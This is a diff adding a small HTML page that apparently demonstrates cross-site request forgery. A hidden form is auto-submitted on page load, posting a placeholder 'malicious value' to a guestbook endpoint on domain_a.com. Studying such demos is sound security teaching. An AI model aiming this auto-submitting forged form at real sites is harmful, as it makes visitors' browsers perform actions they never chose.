@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src=".../jquery.js"></script>
+</head>
+<body>
+    <form id="test" method="POST" action="http://domain_a.com/guestbook">
+        <input type="hidden" name="content" value="恶意的值">
+    </form>
+    <script>
+        $(function() {
+            $("#test").submit();
+        });
+    </script>
+</body>
+</html>
